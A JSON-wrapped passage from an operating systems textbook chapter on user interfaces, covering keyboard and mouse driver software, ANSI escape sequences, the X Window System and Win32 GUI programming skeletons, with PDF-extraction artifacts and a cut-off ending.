            "content": "5.6.1 Input Software\r\nUser input comes primarily from the keyboard and mouse (or somtimes touch\r\nscreens), so let us look at those. On a personal computer, the keyboard contains an\r\nembedded microprocessor which usually communicates through a specialized\r\nserial port with a controller chip on the parentboard (although increasingly\r\nkeyboards are connected to a USB port). An interrupt is generated whenever a key\r\nis struck and a second one is generated whenever a key is released. At each of\r\nthese keyboard interrupts, the keyboard driver extracts the information about what\r\nhappens from the I/O port associated with the keyboard. Everything else happens\r\nin software and is pretty much independent of the hardware.\r\nMost of the rest of this section can be best understood when thinking of typing\r\ncommands to a shell window (command-line interface). This is how programmers\r\ncommonly work. We will discuss graphical interfaces below. Some devices, in\r\nparticular touch screens, are used for input and output. We hav e made an (arbi\u0002trary) choice to discuss them in the section on output devices. We will discuss\r\ngraphical interfaces later in this chapter.\r\nKeyboard Software\r\nThe number in the I/O register is the key number, called the scan code, not the\r\nASCII code. Normal keyboards have fewer than 128 keys, so only 7 bits are need\u0002ed to represent the key number. The eighth bit is set to 0 on a key press and to 1 on\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 395\r\na key release. It is up to the driver to keep track of the status of each key (up or\r\ndown). So all the hardware does is give press and release interrupts. Software does\r\nthe rest.\r\nWhen the A key is struck, for example, the scan code (30) is put in an I/O reg\u0002ister. It is up to the driver to determine whether it is lowercase, uppercase, CTRL\u0002A, ALT-A, CTRL-ALT-A, or some other combination. Since the driver can tell\r\nwhich keys hav e been struck but not yet released (e.g., SHIFT), it has enough\r\ninformation to do the job.\r\nFor example, the key sequence\r\nDEPRESS SHIFT, DEPRESS A, RELEASE A, RELEASE SHIFT\r\nindicates an uppercase A. However, the key sequence\r\nDEPRESS SHIFT, DEPRESS A, RELEASE SHIFT, RELEASE A\r\nalso indicates an uppercase A. Although this keyboard interface puts the full bur\u0002den on the software, it is extremely flexible. For example, user programs may be\r\ninterested in whether a digit just typed came from the top row of keys or the\r\nnumeric keypad on the side. In principle, the driver can provide this information.\r\nTw o possible philosophies can be adopted for the driver. In the first one, the\r\ndriver’s job is just to accept input and pass it upward unmodified. A program read\u0002ing from the keyboard gets a raw sequence of ASCII codes. (Giving user programs\r\nthe scan codes is too primitive, as well as being highly keyboard dependent.)\r\nThis philosophy is well suited to the needs of sophisticated screen editors such\r\nas emacs, which allow the user to bind an arbitrary action to any character or se\u0002quence of characters. It does, however, mean that if the user types dste instead of\r\ndate and then corrects the error by typing three backspaces and ate, followed by a\r\ncarriage return, the user program will be given all 11 ASCII codes typed, as fol\u0002lows:\r\ndste ←←← a t e CR\r\nNot all programs want this much detail. Often they just want the corrected\r\ninput, not the exact sequence of how it was produced. This observation leads to the\r\nsecond philosophy: the driver handles all the intraline editing and just delivers cor\u0002rected lines to the user programs. The first philosophy is character oriented; the\r\nsecond one is line oriented. Originally they were referred to as raw mode and\r\ncooked mode, respectively. The POSIX standard uses the less-picturesque term\r\ncanonical mode to describe line-oriented mode. Noncanonical mode is equiv\u0002alent to raw mode, although many details of the behavior can be changed. POSIX\u0002compatible systems provide several library functions that support selecting either\r\nmode and changing many parameters.\r\nIf the keyboard is in canonical (cooked) mode, characters must be stored until\r\nan entire line has been accumulated, because the user may subsequently decide to\r\nerase part of it. Even if the keyboard is in raw mode, the program may not yet have\n396 INPUT/OUTPUT CHAP. 5\r\nrequested input, so the characters must be buffered to allow type ahead. Either a\r\ndedicated buffer can be used or buffers can be allocated from a pool. The former\r\nputs a fixed limit on type ahead; the latter does not. This issue arises most acutely\r\nwhen the user is typing to a shell window (command-line window in Windows)\r\nand has just issued a command (such as a compilation) that has not yet completed.\r\nSubsequent characters typed have to be buffered because the shell is not ready to\r\nread them. System designers who do not permit users to type far ahead ought to be\r\ntarred and feathered, or worse yet, be forced to use their own system.\r\nAlthough the keyboard and monitor are logically separate devices, many users\r\nhave grown accustomed to seeing the characters they hav e just typed appear on the\r\nscreen. This process is called echoing.\r\nEchoing is complicated by the fact that a program may be writing to the screen\r\nwhile the user is typing (again, think about typing to a shell window). At the very\r\nleast, the keyboard driver has to figure out where to put the new input without its\r\nbeing overwritten by program output.\r\nEchoing also gets complicated when more than 80 characters have to be dis\u0002played in a window with 80-character lines (or some other number). Depending on\r\nthe application, wrapping around to the next line may be appropriate. Some drivers\r\njust truncate lines to 80 characters by throwing away all characters beyond column\r\n80.\r\nAnother problem is tab handling. It is usually up to the driver to compute\r\nwhere the cursor is currently located, taking into account both output from pro\u0002grams and output from echoing, and compute the proper number of spaces to be\r\nechoed.\r\nNow we come to the problem of device equivalence. Logically, at the end of a\r\nline of text, one wants a carriage return, to move the cursor back to column 1, and\r\na line feed, to advance to the next line. Requiring users to type both at the end of\r\neach line would not sell well. It is up to the device driver to convert whatever\r\ncomes in to the format used by the operating system. In UNIX, the Enter key is\r\nconverted to a line feed for internal storage; in Windows it is converted to a car\u0002riage return followed by a line feed.\r\nIf the standard form is just to store a line feed (the UNIX convention), then\r\ncarriage returns (created by the Enter key) should be turned into line feeds. If the\r\ninternal format is to store both (the Windows convention), then the driver should\r\ngenerate a line feed when it gets a carriage return and a carriage return when it gets\r\na line feed. No matter what the internal convention, the monitor may require both\r\na line feed and a carriage return to be echoed in order to get the screen updated\r\nproperly. On a multiuser system such as a mainframe, different users may have\r\ndifferent types of terminals connected to it and it is up to the keyboard driver to get\r\nall the different carriage-return/line-feed combinations converted to the internal\r\nsystem standard and arrange for all echoing to be done right.\r\nWhen operating in canonical mode, some of the input characters have special\r\nmeanings. Figure 5-31 shows all of the special characters required by the POSIX\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 397\r\nstandard. The defaults are all control characters that should not conflict with text\r\ninput or codes used by programs; all except the last two can be changed under pro\u0002gram control.\r\nCharacter POSIX name Comment\r\nCTRL-H ERASE Backspace one character\r\nCTRL-U KILL Erase entire line being typed\r\nCTRL-V LNEXT Inter pret next character literally\r\nCTRL-S STOP Stop output\r\nCTRL-Q START Star t output\r\nDEL INTR Interr upt process (SIGINT)\r\nCTRL-\\ QUIT Force core dump (SIGQUIT)\r\nCTRL-D EOF End of file\r\nCTRL-M CR Carr iage retur n (unchangeable)\r\nCTRL-J NL Line feed (unchangeable)\r\nFigure 5-31. Characters that are handled specially in canonical mode.\r\nThe ERASE character allows the user to rub out the character just typed. It is\r\nusually the backspace (CTRL-H). It is not added to the character queue but instead\r\nremoves the previous character from the queue. It should be echoed as a sequence\r\nof three characters, backspace, space, and backspace, in order to remove the previ\u0002ous character from the screen. If the previous character was a tab, erasing it de\u0002pends on how it was processed when it was typed. If it is immediately expanded\r\ninto spaces, some extra information is needed to determine how far to back up. If\r\nthe tab itself is stored in the input queue, it can be removed and the entire line just\r\noutput again. In most systems, backspacing will only erase characters on the cur\u0002rent line. It will not erase a carriage return and back up into the previous line.\r\nWhen the user notices an error at the start of the line being typed in, it is often\r\nconvenient to erase the entire line and start again. The KILL character erases the\r\nentire line. Most systems make the erased line vanish from the screen, but a few\r\nolder ones echo it plus a carriage return and line feed because some users like to\r\nsee the old line. Consequently, how to echo KILL is a matter of taste. As with\r\nERASE it is usually not possible to go further back than the current line. When a\r\nblock of characters is killed, it may or may not be worth the trouble for the driver\r\nto return buffers to the pool, if one is used.\r\nSometimes the ERASE or KILL characters must be entered as ordinary data.\r\nThe LNEXT character serves as an escape character. In UNIX CTRL-V is the de\u0002fault. As an example, older UNIX systems often used the @ sign for KILL, but the\r\nInternet mail system uses addresses of the form linda@cs.washington.edu. Some\u0002one who feels more comfortable with older conventions might redefine KILL as @,\r\nbut then need to enter an @ sign literally to address email. This can be done by\r\ntyping CTRL-V @. The CTRL-V itself can be entered literally by typing CTRL-V\n398 INPUT/OUTPUT CHAP. 5\r\ntwice consecutively. After seeing a CTRL-V, the driver sets a flag saying that the\r\nnext character is exempt from special processing. The LNEXT character itself is not\r\nentered in the character queue.\r\nTo allow users to stop a screen image from scrolling out of view, control codes\r\nare provided to freeze the screen and restart it later. In UNIX these are STOP,\r\n(CTRL-S) and START, (CTRL-Q), respectively. They are not stored but are used to\r\nset and clear a flag in the keyboard data structure. Whenever output is attempted,\r\nthe flag is inspected. If it is set, no output occurs. Usually, echoing is also sup\u0002pressed along with program output.\r\nIt is often necessary to kill a runaway program being debugged. The INTR\r\n(DEL) and QUIT (CTRL-\\) characters can be used for this purpose. In UNIX,\r\nDEL sends the SIGINT signal to all the processes started up from that keyboard.\r\nImplementing DEL can be quite tricky because UNIX was designed from the be\u0002ginning to handle multiple users at the same time. Thus in the general case, there\r\nmay be many processes running on behalf of many users, and the DEL key must\r\nsignal only the user’s own processes. The hard part is getting the information from\r\nthe driver to the part of the system that handles signals, which, after all, has not\r\nasked for this information.\r\nCTRL-\\ is similar to DEL, except that it sends the SIGQUIT signal, which\r\nforces a core dump if not caught or ignored. When either of these keys is struck,\r\nthe driver should echo a carriage return and line feed and discard all accumulated\r\ninput to allow for a fresh start. The default value for INTR is often CTRL-C instead\r\nof DEL, since many programs use DEL interchangeably with the backspace for\r\nediting.\r\nAnother special character is EOF (CTRL-D), which in UNIX causes any pend\u0002ing read requests for the terminal to be satisfied with whatever is available in the\r\nbuffer, even if the buffer is empty. Typing CTRL-D at the start of a line causes the\r\nprogram to get a read of 0 bytes, which is conventionally interpreted as end-of-file\r\nand causes most programs to act the same way as they would upon seeing end-of\u0002file on an input file.\r\nMouse Software\r\nMost PCs have a mouse, or sometimes a trackball, which is just a mouse lying\r\non its back. One common type of mouse has a rubber ball inside that protrudes\r\nthrough a hole in the bottom and rotates as the mouse is moved over a rough sur\u0002face. As the ball rotates, it rubs against rubber rollers placed on orthogonal shafts.\r\nMotion in the east-west direction causes the shaft parallel to the y-axis to rotate;\r\nmotion in the north-south direction causes the shaft parallel to the x-axis to rotate.\r\nAnother popular type is the optical mouse, which is equipped with one or more\r\nlight-emitting diodes and photodetectors on the bottom. Early ones had to operate\r\non a special mousepad with a rectangular grid etched onto it so the mouse could\r\ncount lines crossed. Modern optical mice have an image-processing chip in them\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 399\r\nand make continuous low-resolution photos of the surface under them, looking for\r\nchanges from image to image.\r\nWhenever a mouse has moved a certain minimum distance in either direction\r\nor a button is depressed or released, a message is sent to the computer. The mini\u0002mum distance is about 0.1 mm (although it can be set in software). Some people\r\ncall this unit a mickey. Mice (or occasionally, mouses) can have one, two, or three\r\nbuttons, depending on the designers’ estimate of the users’ intellectual ability to\r\nkeep track of more than one button. Some mice have wheels that can send addi\u0002tional data back to the computer. Wireless mice are the same as wired mice except\r\nthat instead of sending their data back to the computer over a wire, they use\r\nlow-power radios, for example, using the Bluetooth standard.\r\nThe message to the computer contains three items: Δx, Δy, buttons. The first\r\nitem is the change in x position since the last message. Then comes the change in\r\ny position since the last message. Finally, the status of the buttons is included. The\r\nformat of the message depends on the system and the number of buttons the mouse\r\nhas. Usually, it takes 3 bytes. Most mice report back a maximum of 40 times/sec,\r\nso the mouse may have moved multiple mickeys since the last report.\r\nNote that the mouse indicates only changes in position, not absolute position\r\nitself. If the mouse is picked up and put down gently without causing the ball to\r\nrotate, no messages will be sent.\r\nMany GUIs distinguish between single clicks and double clicks of a mouse\r\nbutton. If two clicks are close enough in space (mickeys) and also close enough in\r\ntime (milliseconds), a double click is signaled. The maximum for ‘‘close enough’’\r\nis up to the software, with both parameters usually being user settable."
          },
          "5.6.2 Output Software": {
            "page": 430,
            "content": "5.6.2 Output Software\r\nNow let us consider output software. First we will look at simple output to a\r\ntext window, which is what programmers normally prefer to use. Then we will\r\nconsider graphical user interfaces, which other users often prefer.\r\nText Windows\r\nOutput is simpler than input when the output is sequentially in a single font,\r\nsize, and color. For the most part, the program sends characters to the current win\u0002dow and they are displayed there. Usually, a block of characters, for example, a\r\nline, is written in one system call.\r\nScreen editors and many other sophisticated programs need to be able to\r\nupdate the screen in complex ways such as replacing one line in the middle of the\r\nscreen. To accommodate this need, most output drivers support a series of com\u0002mands to move the cursor, insert and delete characters or lines at the cursor, and so\r\non. These commands are often called escape sequences. In the heyday of the\r\ndumb 25 × 80 ASCII terminal, there were hundreds of terminal types, each with its\n400 INPUT/OUTPUT CHAP. 5\r\nown escape sequences. As a consequence, it was difficult to write software that\r\nworked on more than one terminal type.\r\nOne solution, which was introduced in Berkeley UNIX, was a terminal data\u0002base called termcap. This software package defined a number of basic actions,\r\nsuch as moving the cursor to (row, column). To move the cursor to a particular lo\u0002cation, the software, say, an editor, used a generic escape sequence which was then\r\nconverted to the actual escape sequence for the terminal being written to. In this\r\nway, the editor worked on any terminal that had an entry in the termcap database.\r\nMuch UNIX software still works this way, even on personal computers.\r\nEventually, the industry saw the need for standardizing the escape sequence, so\r\nan ANSI standard was developed. Some of the values are shown in Fig. 5-32.\r\nEscape sequence Meaning\r\nESC [ nA Move up n lines\r\nESC [ nB Move down n lines\r\nESC [ n C Move right n spaces\r\nESC [ n D Move left n spaces\r\nESC [ m ; n H Move cursor to (m,n)\r\nESC [ s J Clear screen from cursor (0 to end, 1 from start, 2 all)\r\nESC [ sK Clear line from cursor (0 to end, 1 from start, 2 all)\r\nESC [ n L Inser t n lines at cursor\r\nESC [ n M Delete n lines at cursor\r\nESC [ nP Delete n chars at cursor\r\nESC [ n@ Inser t n chars at cursor\r\nESC [ n m Enable rendition n (0 = normal, 4 = bold, 5 = blinking, 7 = rev erse)\r\nESC M Scroll the screen backward if the cursor is on the top line\r\nFigure 5-32. The ANSI escape sequences accepted by the terminal driver on out\u0002put. ESC denotes the ASCII escape character (0x1B), and n, m, and s are optio\u0002nal numeric parameters.\r\nConsider how these escape sequences might be used by a text editor. Suppose\r\nthat the user types a command telling the editor to delete all of line 3 and then\r\nclose up the gap between lines 2 and 4. The editor might send the following\r\nescape sequence over the serial line to the terminal:\r\nESC [ 3 ; 1 H ESC [ 0 K ESC [ 1 M\r\n(where the spaces are used above only to separate the symbols; they are not trans\u0002mitted). This sequence moves the cursor to the start of line 3, erases the entire line,\r\nand then deletes the now-empty line, causing all the lines starting at 5 to move up\r\none line. Then what was line 4 becomes line 3; what was line 5 becomes line 4,\r\nand so on. Analogous escape sequences can be used to add text to the middle of the\r\ndisplay. Words can be added or removed in a similar way.\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 401\r\nThe X Window System\r\nNearly all UNIX systems base their user interface on the X Window System\r\n(often just called X), developed at M.I.T. as part of project Athena in the 1980s. It\r\nis very portable and runs entirely in user space. It was originally intended for con\u0002necting a large number of remote user terminals with a central compute server, so\r\nit is logically split into client software and host software, which can potentially run\r\non different computers. On modern personal computers, both parts can run on the\r\nsame machine. On Linux systems, the popular Gnome and KDE desktop environ\u0002ments run on top of X.\r\nWhen X is running on a machine, the software that collects input from the\r\nkeyboard and mouse and writes output to the screen is called the X server. It has\r\nto keep track of which window is currently selected (where the mouse pointer is),\r\nso it knows which client to send any new keyboard input to. It communicates with\r\nrunning programs (possible over a network) called X clients. It sends them\r\nkeyboard and mouse input and accepts display commands from them.\r\nIt may seem odd that the X server is always inside the user’s computer while\r\nthe X client may be off on a remote compute server, but just think of the X server’s\r\nmain job: displaying bits on the screen, so it makes sense to be near the user. From\r\nthe program’s point of view, it is a client telling the server to do things, like display\r\ntext and geometric figures. The server (in the local PC) just does what it is told, as\r\ndo all servers.\r\nThe arrangement of client and server is shown in Fig. 5-33 for the case where\r\nthe X client and X server are on different machines. But when running Gnome or\r\nKDE on a single machine, the client is just some application program using the X\r\nlibrary talking to the X server on the same machine (but using a TCP connection\r\nover sockets, the same as it would do in the remote case).\r\nThe reason it is possible to run the X Window System on top of UNIX (or an\u0002other operating system) on a single machine or over a network is that what X really\r\ndefines is the X protocol between the X client and the X server, as shown in\r\nFig. 5-33. It does not matter whether the client and server are on the same ma\u0002chine, separated by 100 meters over a local area network, or are thousands of kilo\u0002meters apart and connected by the Internet. The protocol and operation of the sys\u0002tem is identical in all cases.\r\nX is just a windowing system. It is not a complete GUI. To get a complete\r\nGUI, others layer of software are run on top of it. One layer is Xlib, which is a set\r\nof library procedures for accessing the X functionality. These procedures form the\r\nbasis of the X Window System and are what we will examine below, but they are\r\ntoo primitive for most user programs to access directly. For example, each mouse\r\nclick is reported separately, so that determining that two clicks really form a double\r\nclick has to be handled above Xlib.\r\nTo make programming with X easier, a toolkit consisting of the Intrinsics is\r\nsupplied as part of X. This layer manages buttons, scroll bars, and other GUI\n402 INPUT/OUTPUT CHAP. 5\r\nRemote host\r\nWindow\r\nmanager\r\nApplication\r\nprogram\r\nMotif\r\nIntrinsics\r\nXlib\r\nX client\r\nUNIX\r\nHardware\r\nX server\r\nUNIX\r\nHardware\r\nWindow\r\nUser\r\nspace\r\nKernel\r\nspace\r\nX protocol\r\nNetwork\r\nFigure 5-33. Clients and servers in the M.I.T. X Window System.\r\nelements, called widgets. To make a true GUI interface, with a uniform look and\r\nfeel, another layer is needed (or several of them). One example is Motif, shown in\r\nFig. 5-33, which is the basis of the Common Desktop Environment used on Solaris\r\nand other commercial UNIX systems Most applications make use of calls to Motif\r\nrather than Xlib. Gnome and KDE have a similar structure to Fig. 5-33, only with\r\ndifferent libraries. Gnome uses the GTK+ library and KDE uses the Qt library.\r\nWhether having two GUIs is better than one is debatable.\r\nAlso worth noting is that window management is not part of X itself. The de\u0002cision to leave it out was fully intentional. Instead, a separate X client process, cal\u0002led a window manager, controls the creation, deletion, and movement of windows\r\non the screen. To manage windows, it sends commands to the X server telling it\r\nwhat to do. It often runs on the same machine as the X client, but in theory can run\r\nanywhere.\r\nThis modular design, consisting of several layers and multiple programs,\r\nmakes X highly portable and flexible. It has been ported to most versions of\r\nUNIX, including Solaris, all variants of BSD, AIX, Linux, and so on, making it\r\npossible for application developers to have a standard user interface for multiple\r\nplatforms. It has also been ported to other operating systems. In contrast, in Win\u0002dows, the windowing and GUI systems are mixed together in the GDI and located\r\nin the kernel, which makes them harder to maintain, and of, course, not portable.\r\nNow let us take a brief look at X as viewed from the Xlib level. When an X\r\nprogram starts, it opens a connection to one or more X servers—let us call them\r\nworkstations even though they might be collocated on the same machine as the X\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 403\r\nprogram itself. X considers this connection to be reliable in the sense that lost and\r\nduplicate messages are handled by the networking software and it does not have to\r\nworry about communication errors. Usually, TCP/IP is used between the client and\r\nserver.\r\nFour kinds of messages go over the connection:\r\n1. Drawing commands from the program to the workstation.\r\n2. Replies by the workstation to program queries.\r\n3. Keyboard, mouse, and other event announcements.\r\n4. Error messages.\r\nMost drawing commands are sent from the program to the workstation as one\u0002way messages. No reply is expected. The reason for this design is that when the\r\nclient and server processes are on different machines, it may take a substantial\r\nperiod of time for the command to reach the server and be carried out. Blocking\r\nthe application program during this time would slow it down unnecessarily. On the\r\nother hand, when the program needs information from the workstation, it simply\r\nhas to wait until the reply comes back.\r\nLike Windows, X is highly event driven. Events flow from the workstation to\r\nthe program, usually in response to some human action such as keyboard strokes,\r\nmouse movements, or a window being uncovered. Each event message is 32 bytes,\r\nwith the first byte giving the event type and the next 31 bytes providing additional\r\ninformation. Several dozen kinds of events exist, but a program is sent only those\r\nev ents that it has said it is willing to handle. For example, if a program does not\r\nwant to hear about key releases, it is not sent any key-release events. As in Win\u0002dows, events are queued, and programs read events from the input queue. However,\r\nunlike Windows, the operating system never calls procedures within the applica\u0002tion program on its own. It does not even know which procedure handles which\r\nev ent.\r\nA key concept in X is the resource. A resource is a data structure that holds\r\ncertain information. Application programs create resources on workstations. Re\u0002sources can be shared among multiple processes on the workstation. Resources\r\ntend to be short-lived and do not survive workstation reboots. Typical resources in\u0002clude windows, fonts, colormaps (color palettes), pixmaps (bitmaps), cursors, and\r\ngraphic contexts. The latter are used to associate properties with windows and are\r\nsimilar in concept to device contexts in Windows.\r\nA rough, incomplete skeleton of an X program is shown in Fig. 5-34. It begins\r\nby including some required headers and then declaring some variables. It then\r\nconnects to the X server specified as the parameter to XOpenDisplay. Then it allo\u0002cates a window resource and stores a handle to it in win. In practice, some ini\u0002tialization would happen here. After that it tells the window manager that the new\r\nwindow exists so the window manager can manage it.\n404 INPUT/OUTPUT CHAP. 5\r\n#include <X11/Xlib.h>\r\n#include <X11/Xutil.h>\r\nmain(int argc, char *argv[])\r\n{\r\nDisplay disp; /* ser ver identifier */\r\nWindow win; /* window identifier */\r\nGC gc; /* graphic context identifier */\r\nXEvent event; /* storage for one event */\r\nint running = 1;\r\ndisp = XOpenDisplay(\"display name\"); /* connect to the X server */\r\nwin = XCreateSimpleWindow(disp, ... ); /* allocate memory for new window */\r\nXSetStandardProper ties(disp, ...); /* announces window to window mgr */\r\ngc = XCreateGC(disp, win, 0, 0); /* create graphic context */\r\nXSelectInput(disp, win, ButtonPressMask | KeyPressMask | ExposureMask);\r\nXMapRaised(disp, win); /* display window; send Expose event */\r\nwhile (running) {\r\nXNextEvent(disp, &ev ent); /* get next event */\r\nswitch (event.type) {\r\ncase Expose: ...; break; /* repaint window */\r\ncase ButtonPress: ...; break; /* process mouse click */\r\ncase Keypress: ...; break; /* process keyboard input */\r\n}\r\n}\r\nXFreeGC(disp, gc); /* release graphic context */\r\nXDestroyWindow(disp, win); /* deallocate window’s memor y space */\r\nXCloseDisplay(disp); /* tear down networ k connection */\r\n}\r\nFigure 5-34. A skeleton of an X Window application program.\r\nThe call to XCreateGC creates a graphic context in which properties of the\r\nwindow are stored. In a more complete program, they might be initialized here.\r\nThe next statement, the call to XSelectInput, tells the X server which events the\r\nprogram is prepared to handle. In this case it is interested in mouse clicks,\r\nkeystrokes, and windows being uncovered. In practice, a real program would be\r\ninterested in other events as well. Finally, the call to XMapRaised maps the new\r\nwindow onto the screen as the uppermost window. At this point the window be\u0002comes visible on the screen.\r\nThe main loop consists of two statements and is logically much simpler than\r\nthe corresponding loop in Windows. The first statement here gets an event and the\r\nsecond one dispatches on the event type for processing. When some event indicates\r\nthat the program has finished, running is set to 0 and the loop terminates. Before\r\nexiting, the program releases the graphic context, window, and connection.\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 405\r\nIt is worth mentioning that not everyone likes a GUI. Many programmers pre\u0002fer a traditional command-line oriented interface of the type discussed in Sec. 5.6.1\r\nabove. X handles this via a client program called xterm. This program emulates a\r\nvenerable VT102 intelligent terminal, complete with all the escape sequences.\r\nThus editors such as vi and emacs and other software that uses termcap work in\r\nthese windows without modification.\r\nGraphical User Interfaces\r\nMost personal computers offer a GUI (Graphical User Interface). The\r\nacronym GUI is pronounced ‘‘gooey.’’\r\nThe GUI was invented by Douglas Engelbart and his research group at the\r\nStanford Research Institute. It was then copied by researchers at Xerox PARC.\r\nOne fine day, Steve Jobs, cofounder of Apple, was touring PARC and saw a GUI\r\non a Xerox computer and said something to the effect of ‘‘Holy mackerel. This is\r\nthe future of computing.’’ The GUI gav e him the idea for a new computer, which\r\nbecame the Apple Lisa. The Lisa was too expensive and was a commercial failure,\r\nbut its successor, the Macintosh, was a huge success.\r\nWhen Microsoft got a Macintosh prototype so it could develop Microsoft\r\nOffice on it, it begged Apple to license the interface to all comers so it would be\u0002come the new industry standard. (Microsoft made much more money from Office\r\nthan from MS-DOS, so it was willing to abandon MS-DOS to have a better plat\u0002form for Office.) The Apple executive in charge of the Macintosh, Jean-Louis\r\nGasse´e, refused and Steve Jobs was no longer around to overrule him. Eventually,\r\nMicrosoft got a license for elements of the interface. This formed the basis of\r\nWindows. When Windows began to catch on, Apple sued Microsoft, claiming\r\nMicrosoft had exceeded the license, but the judge disagreed and Windows went on\r\nto overtake the Macintosh. If Gasse´e had agreed with the many people within\r\nApple who also wanted to license the Macintosh software to everyone and his\r\nuncle, Apple would have become insanely rich on licensing fees alone and Win\u0002dows would not exist now.\r\nLeaving aside touch-enabled interfaces for the moment, a GUI has four essen\u0002tial elements, denoted by the characters WIMP. These letters stand for Windows,\r\nIcons, Menus, and Pointing device, respectively. Windows are rectangular blocks\r\nof screen area used to run programs. Icons are little symbols that can be clicked on\r\nto cause some action to happen. Menus are lists of actions from which one can be\r\nchosen. Finally, a pointing device is a mouse, trackball, or other hardware device\r\nused to move a cursor around the screen to select items.\r\nThe GUI software can be implemented in either user-level code, as is done in\r\nUNIX systems, or in the operating system itself, as in the case in Windows.\r\nInput for GUI systems still uses the keyboard and mouse, but output almost al\u0002ways goes to a special hardware board called a graphics adapter. A graphics\r\nadapter contains a special memory called video RAM that holds the images that\n406 INPUT/OUTPUT CHAP. 5\r\nappear on the screen. Graphics adapters often have powerful 32- or 64-bit CPUs\r\nand up to 4 GB of their own RAM, separate from the computer’s main memory.\r\nEach graphics adapter supports some number of screen sizes. Common sizes\r\n(horizontal × vertical in pixels) are 1280 × 960, 1600 × 1200, 1920 ×1080, 2560 ×\r\n1600, and 3840 × 2160. Many resolutions in practice are in the ratio of 4:3, which\r\nfits the aspect ratio of NTSC and PAL television sets and thus gives square pixels\r\non the same monitors used for television sets. Higher resolutions are intended for\r\nwide-screen monitors whose aspect ratio matches them. At a resolution of just\r\n1920 × 1080 (the size of full HD videos), a color display with 24 bits per pixel re\u0002quires about 6.2 MB of RAM just to hold the image, so with 256 MB or more, the\r\ngraphics adapter can hold many images at once. If the full screen is refreshed 75\r\ntimes/sec, the video RAM must be capable of delivering data continuously at 445\r\nMB/sec.\r\nOutput software for GUIs is a massive topic. Many 1500-page books have\r\nbeen written about the Windows GUI alone (e.g., Petzold, 2013; Rector and New\u0002comer, 1997; and Simon, 1997). Clearly, in this section, we can only scratch the\r\nsurface and present a few of the underlying concepts. To make the discussion con\u0002crete, we will describe the Win32 API, which is supported by all 32-bit versions of\r\nWindows. The output software for other GUIs is roughly comparable in a general\r\nsense, but the details are very different.\r\nThe basic item on the screen is a rectangular area called a window. A win\u0002dow’s position and size are uniquely determined by giving the coordinates (in pix\u0002els) of two diagonally opposite corners. A window may contain a title bar, a menu\r\nbar, a tool bar, a vertical scroll bar, and a horizontal scroll bar. A typical window is\r\nshown in Fig. 5-35. Note that the Windows coordinate system puts the origin in\r\nthe upper left-hand corner and has y increase downward, which is different from\r\nthe Cartesian coordinates used in mathematics.\r\nWhen a window is created, the parameters specify whether it can be moved by\r\nthe user, resized by the user, or scrolled (by dragging the thumb on the scroll bar)\r\nby the user. The main window produced by most programs can be moved, resized,\r\nand scrolled, which has enormous consequences for the way Windows programs\r\nare written. In particular, programs must be informed about changes to the size of\r\ntheir windows and must be prepared to redraw the contents of their windows at any\r\ntime, even when they least expect it.\r\nAs a consequence, Windows programs are message oriented. User actions in\u0002volving the keyboard or mouse are captured by Windows and converted into mes\u0002sages to the program owning the window being addressed. Each program has a\r\nmessage queue to which messages relating to all its windows are sent. The main\r\nloop of the program consists of fishing out the next message and processing it by\r\ncalling an internal procedure for that message type. In some cases, Windows itself\r\nmay call these procedures directly, bypassing the message queue. This model is\r\nquite different from the UNIX model of procedural code that makes system calls to\r\ninteract with the operating system. X, however, is event oriented.\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 407\r\nThumb\r\nTitle bar\r\nFile Edit View Tools Options Help\r\nClient area\r\n(200, 100)\r\n(0, 0)\r\n(0, 767)\r\nMenu bar\r\nTool bar\r\nWindow\r\nScroll bar\r\n(1023, 767)\r\n(1023, 0)\r\n12\r\n6\r\n9 3\r\n8 4 7 5\r\n11 1 10 2\r\nFigure 5-35. A sample window located at (200, 100) on an XGA display.\r\nTo make this programming model clearer, consider the example of Fig. 5-36.\r\nHere we see the skeleton of a main program for Windows. It is not complete and\r\ndoes no error checking, but it shows enough detail for our purposes. It starts by in\u0002cluding a header file, windows.h, which contains many macros, data types, con\u0002stants, function prototypes, and other information needed by Windows programs.\r\nThe main program starts with a declaration giving its name and parameters.\r\nThe WINAPI macro is an instruction to the compiler to use a certain parameter-pas\u0002sing convention and will not be of further concern to us. The first parameter, h, is\r\nan instance handle and is used to identify the program to the rest of the system. To\r\nsome extent, Win32 is object oriented, which means that the system contains ob\u0002jects (e.g., programs, files, and windows) that have some state and associated code,\r\ncalled methods, that operate on that state. Objects are referred to using handles,\r\nand in this case, h identifies the program. The second parameter is present only for\r\nreasons of backward compatibility. It is no longer actually used. The third parame\u0002ter, szCmd, is a zero-terminated string containing the command line that started the\r\nprogram, even if it was not started from a command line. The fourth parameter,\n408 INPUT/OUTPUT CHAP. 5\r\n#include <windows.h>\r\nint WINAPI WinMain(HINSTANCE h, HINSTANCE, hprev, char *szCmd, int iCmdShow)\r\n{\r\nWNDCLASS wndclass; /* class object for this window */\r\nMSG msg; /* incoming messages are stored here */\r\nHWND hwnd; /* handle (pointer) to the window object */\r\n/\r\n* Initialize wndclass */\r\nwndclass.lpfnWndProc = WndProc; /* tells which procedure to call */\r\nwndclass.lpszClassName = \"Program name\"; /* text for title bar */\r\nwndclass.hIcon = LoadIcon(NULL, IDI APPLICATION); /* load program icon */\r\nwndclass.hCursor = LoadCursor(NULL, IDC ARROW); /* load mouse cursor */\r\nRegisterClass(&wndclass); /* tell Windows about wndclass */\r\nhwnd = CreateWindow ( ... ) /* allocate storage for the window */\r\nShowWindow(hwnd, iCmdShow); /* display the window on the screen */\r\nUpdateWindow(hwnd); /* tell the window to paint itself */\r\nwhile (GetMessage(&msg, NULL, 0, 0)) { /* get message from queue */\r\nTr anslateMessage(&msg); /* translate the message */\r\nDispatchMessage(&msg); /* send msg to the appropriate procedure */\r\n}\r\nretur n(msg.wParam);\r\n}\r\nlong CALLBACK WndProc(HWND hwnd, UINT message, UINT wParam, long lParam)\r\n{\r\n/\r\n* Declarations go here. */\r\nswitch (message) {\r\ncase WM CREATE: ... ; retur n ... ; /* create window */\r\ncase WM PAINT: ... ; retur n ... ; /* repaint contents of window */\r\ncase WM DESTROY : ... ; retur n ... ; /* destroy window */\r\n}\r\nretur 